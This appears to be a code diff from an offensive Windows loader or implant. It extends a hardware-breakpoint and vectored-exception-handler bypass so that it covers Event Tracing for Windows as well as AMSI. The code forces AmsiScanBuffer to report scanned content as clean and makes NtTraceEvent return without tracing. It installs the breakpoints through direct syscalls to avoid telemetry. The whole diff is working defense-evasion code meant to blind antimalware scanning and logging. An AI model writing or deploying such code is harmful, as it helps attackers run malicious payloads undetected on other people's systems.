@@ -18,20 +18,26 @@ static BOOL SafeMemAccessCheck(PVOID addr, SIZE_T size) {
 }
 
 // =============================================================================
-// VEH-BASED AMSI BYPASS WITH RE-ARMING & AUTO-REMOVAL
+// VEH-BASED HWBP BYPASS (AMSI, ETW, etc.)
 // =============================================================================
 
-#define VEH_MAX_INVOCATIONS 50
+#define VEH_MAX_INVOCATIONS 100
+#define MAX_HWBP 4
 
-typedef struct _VEH_AMSI_STATE {
-    PVOID  TargetAddress;       // AmsiScanBuffer address
-    PVOID  VehHandle;           // VEH registration handle
-    DWORD  DrIndex;             // Debug register index (0-3)
+typedef struct _VEH_HWBP_STATE {
+    PVOID  TargetAddress;
+    DWORD  DrIndex;
     volatile LONG InvocationCount;
     BOOL   IsActive;
-} VEH_AMSI_STATE;
+    BOOL   IsAMSI; // Flag for AMSI-specific stack patching
+} VEH_HWBP_STATE;
 
-static VEH_AMSI_STATE g_VehState = {0};
+typedef struct _VEH_GLOBAL_STATE {
+    VEH_HWBP_STATE Breakpoints[MAX_HWBP];
+    PVOID VehHandle;
+} VEH_GLOBAL_STATE;
+
+static VEH_GLOBAL_STATE g_VehState = {0};
 
 // -----------------------------------------------------------------------------
 // Find a RET gadget in ntdll as fallback for RIP redirection
@@ -57,33 +63,47 @@ static PVOID FindNtdllRetGadget() {
 }
 
 // -----------------------------------------------------------------------------
-// VEH Callback – intercepts HWBP on AmsiScanBuffer, re-arms, auto-removes
+// VEH Callback – intercepts HWBP, re-arms, auto-removes
 // -----------------------------------------------------------------------------
 static LONG CALLBACK VEHCallback(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
     PEXCEPTION_RECORD pRec = ExceptionInfo->ExceptionRecord;
     PCONTEXT pCtx = ExceptionInfo->ContextRecord;
 
     if (pRec->ExceptionCode != EXCEPTION_SINGLE_STEP) return EXCEPTION_CONTINUE_SEARCH;
-    if (pRec->ExceptionAddress != g_VehState.TargetAddress) return EXCEPTION_CONTINUE_SEARCH;
 
-    // Confirm the correct DR triggered
+    VEH_HWBP_STATE *pBp = NULL;
     DWORD bpTriggered = (pCtx->Dr6 & 0x0F);
-    if (!(bpTriggered & (1 << g_VehState.DrIndex))) return EXCEPTION_CONTINUE_SEARCH;
 
-    // Increment invocation counter
-    LONG count = InterlockedIncrement(&g_VehState.InvocationCount);
-
-    // Patch result: set AMSI_RESULT_CLEAN via stack
-    PDWORD pResult = (PDWORD)(pCtx->Rsp + 0x30);
-    if (pResult && SafeMemAccessCheck(pResult, sizeof(DWORD))) {
-        *pResult = 0; // AMSI_RESULT_CLEAN
+    for (int i = 0; i < MAX_HWBP; i++) {
+        if (g_VehState.Breakpoints[i].IsActive && (bpTriggered & (1 << g_VehState.Breakpoints[i].DrIndex))) {
+            if (pRec->ExceptionAddress == g_VehState.Breakpoints[i].TargetAddress) {
+                pBp = &g_VehState.Breakpoints[i];
+                break;
+            }
+        }
     }
 
-    // Set return value to S_OK
+    if (!pBp) return EXCEPTION_CONTINUE_SEARCH;
+
+    // Increment invocation counter
+    LONG count = InterlockedIncrement(&pBp->InvocationCount);
+
+    // Apply bypass logic
+    if (pBp->IsAMSI) {
+        // Patch result: set AMSI_RESULT_CLEAN via stack
+        PDWORD pResult = (PDWORD)(pCtx->Rsp + 0x30);
+        if (pResult && SafeMemAccessCheck(pResult, sizeof(DWORD))) {
+            *pResult = 0; // AMSI_RESULT_CLEAN
+        }
+    }
+
+    // Set return value (E_INVALIDARG for AMSI, STATUS_SUCCESS for others)
+    // Actually, for AmsiScanBuffer, S_OK (0) with result=CLEAN is better.
+    // For NtTraceEvent, STATUS_SUCCESS (0) is perfect.
     pCtx->Rax = 0;
 
-    // Redirect RIP to after the function (find RET in AmsiScanBuffer)
-    PBYTE pFunc = (PBYTE)g_VehState.TargetAddress;
+    // Redirect RIP to a RET instruction
+    PBYTE pFunc = (PBYTE)pBp->TargetAddress;
     BOOL found = FALSE;
     if (pFunc && SafeMemAccessCheck(pFunc, 0x200)) {
         for (SIZE_T i = 0; i < 0x200; i++) {
@@ -100,7 +120,6 @@ static LONG CALLBACK VEHCallback(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
         }
     }
 
-    // Fallback: use ntdll ret gadget if we couldn't find one
     if (!found) {
         PVOID retGadget = FindNtdllRetGadget();
         if (retGadget) pCtx->Rip = (DWORD64)retGadget;
@@ -109,26 +128,10 @@ static LONG CALLBACK VEHCallback(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
     // Clear Dr6 status
     pCtx->Dr6 = 0;
 
-    // Re-arm the hardware breakpoint for next invocation
-    if (count < VEH_MAX_INVOCATIONS) {
-        // Keep DR set – the breakpoint stays armed
-        // Just ensure it's still configured
-        switch (g_VehState.DrIndex) {
-            case 0: pCtx->Dr0 = (DWORD64)g_VehState.TargetAddress; break;
-            case 1: pCtx->Dr1 = (DWORD64)g_VehState.TargetAddress; break;
-            case 2: pCtx->Dr2 = (DWORD64)g_VehState.TargetAddress; break;
-            case 3: pCtx->Dr3 = (DWORD64)g_VehState.TargetAddress; break;
-        }
-        // Re-enable in DR7
-        pCtx->Dr7 |= (1 << (g_VehState.DrIndex * 2));
-    } else {
-        // Auto-remove after VEH_MAX_INVOCATIONS
-        pCtx->Dr0 = pCtx->Dr1 = pCtx->Dr2 = pCtx->Dr3 = 0;
-        pCtx->Dr7 = 0x400; // default
-        g_VehState.IsActive = FALSE;
-
-        // Schedule VEH removal (can't remove inside handler safely)
-        // Mark for removal; caller should check and call RemoveVEH
+    // Re-arm logic
+    if (count >= VEH_MAX_INVOCATIONS) {
+        pBp->IsActive = FALSE;
+        // The actual DR clearing will happen in the next SetContext or during cleanup
     }
 
     return EXCEPTION_CONTINUE_EXECUTION;
@@ -138,19 +141,16 @@ static LONG CALLBACK VEHCallback(_In_ PEXCEPTION_POINTERS ExceptionInfo) {
 // INSTALL HWBP VIA SYSCALLS (NtGet/SetThreadContext)
 // =============================================================================
 
-static BOOL InstallHWBP_Syscall(PVOID targetAddr) {
+static BOOL InstallHWBP_Syscall(PVOID targetAddr, BOOL isAmsi) {
     if (!targetAddr) return FALSE;
 
-    g_VehState.TargetAddress = targetAddr;
-    g_VehState.InvocationCount = 0;
-
-    // Register VEH handler (first in chain)
+    // Register VEH handler once
     if (!g_VehState.VehHandle) {
         g_VehState.VehHandle = AddVectoredExceptionHandler(1, VEHCallback);
     }
     if (!g_VehState.VehHandle) return FALSE;
 
-    // Use syscalls for Get/SetThreadContext to avoid telemetry
+    // Use syscalls for Get/SetThreadContext
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     HANDLE hThread = GetCurrentThread();
@@ -159,33 +159,49 @@ static BOOL InstallHWBP_Syscall(PVOID targetAddr) {
         g_SyscallGadget, hThread, &ctx);
     if (status != 0) return FALSE;
 
-    // Find an empty debug register to avoid clobbering existing ones
-    BOOL set = FALSE;
-    for (int i = 0; i < 4; i++) {
-        if (!(ctx.Dr7 & (1 << (i * 2)))) { // If DRi is not enabled
-            switch (i) {
-                case 0: ctx.Dr0 = (DWORD64)targetAddr; break;
-                case 1: ctx.Dr1 = (DWORD64)targetAddr; break;
-                case 2: ctx.Dr2 = (DWORD64)targetAddr; break;
-                case 3: ctx.Dr3 = (DWORD64)targetAddr; break;
-            }
-            // Enable + execute
-            ctx.Dr7 |= (1 << (i * 2));
-            ctx.Dr7 &= ~(3 << (16 + i * 4)); // Execution
-            ctx.Dr7 &= ~(3 << (18 + i * 4)); // 1 byte
-            g_VehState.DrIndex = i;
-            set = TRUE;
+    // Find an empty debug register
+    int slot = -1;
+    for (int i = 0; i < MAX_HWBP; i++) {
+        if (!g_VehState.Breakpoints[i].IsActive) {
+            slot = i;
             break;
         }
     }
+    if (slot == -1) return FALSE;
 
-    if (!set) return FALSE;
+    // Find an empty DR register in the context
+    int drIdx = -1;
+    for (int i = 0; i < 4; i++) {
+        if (!(ctx.Dr7 & (1 << (i * 2)))) {
+            drIdx = i;
+            break;
+        }
+    }
+    if (drIdx == -1) return FALSE;
+
+    // Configure the breakpoint
+    VEH_HWBP_STATE *pBp = &g_VehState.Breakpoints[slot];
+    pBp->TargetAddress = targetAddr;
+    pBp->DrIndex = drIdx;
+    pBp->InvocationCount = 0;
+    pBp->IsActive = TRUE;
+    pBp->IsAMSI = isAmsi;
+
+    switch (drIdx) {
+        case 0: ctx.Dr0 = (DWORD64)targetAddr; break;
+        case 1: ctx.Dr1 = (DWORD64)targetAddr; break;
+        case 2: ctx.Dr2 = (DWORD64)targetAddr; break;
+        case 3: ctx.Dr3 = (DWORD64)targetAddr; break;
+    }
+
+    ctx.Dr7 |= (1 << (drIdx * 2));
+    ctx.Dr7 &= ~(3 << (16 + drIdx * 4)); // Execution
+    ctx.Dr7 &= ~(3 << (18 + drIdx * 4)); // 1 byte
 
     status = InvokeSyscall(g_ApiTable.syscalls.NtSetContextThread.ssn,
         g_SyscallGadget, hThread, &ctx);
     
-    g_VehState.IsActive = (status == 0);
-    return g_VehState.IsActive;
+    return (status == 0);
 }
 
 // =============================================================================
@@ -197,9 +213,9 @@ static void RemoveVEH() {
         RemoveVectoredExceptionHandler(g_VehState.VehHandle);
         g_VehState.VehHandle = NULL;
     }
-    g_VehState.IsActive = FALSE;
 
-    // Clear debug registers via syscall
+    for (int i = 0; i < MAX_HWBP; i++) g_VehState.Breakpoints[i].IsActive = FALSE;
+
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     HANDLE hThread = GetCurrentThread();
@@ -209,6 +225,7 @@ static void RemoveVEH() {
     ctx.Dr6 = 0;
     InvokeSyscall(g_ApiTable.syscalls.NtSetContextThread.ssn, g_SyscallGadget, hThread, &ctx);
 }
+
 
 // =============================================================================
 // PUBLIC: AMSI BYPASS VIA RE-ARMING VEH
@@ -259,7 +276,41 @@ static BOOL BypassAMSI_HWBP() {
     }
     if (!pAmsiScanBuffer) return FALSE;
 
-    return InstallHWBP_Syscall(pAmsiScanBuffer);
+    return InstallHWBP_Syscall(pAmsiScanBuffer, TRUE);
+}
+
+// =============================================================================
+// PUBLIC: ETW BYPASS VIA HWBP
+// =============================================================================
+
+static BOOL BypassETW_HWBP() {
+    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
+    if (!hNtdll) return FALSE;
+
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
+    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (!expRVA) return FALSE;
+
+    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);
+    PDWORD pNames = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
+    PDWORD pFuncs = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
+    PWORD  pOrds  = (PWORD)((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);
+
+    PVOID pNtTraceEvent = NULL;
+    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
+        const char *name = (const char *)((PBYTE)hNtdll + pNames[i]);
+        if (name[0] == 'N' && name[1] == 't' && name[2] == 'T' &&
+            name[3] == 'r' && name[4] == 'a' && name[5] == 'c' &&
+            name[6] == 'e' && name[7] == 'E') {
+            pNtTraceEvent = (PVOID)((PBYTE)hNtdll + pFuncs[pOrds[i]]);
+            break;
+        }
+    }
+    if (!pNtTraceEvent) return FALSE;
+
+    return InstallHWBP_Syscall(pNtTraceEvent, FALSE);
 }
 
 #endif
+
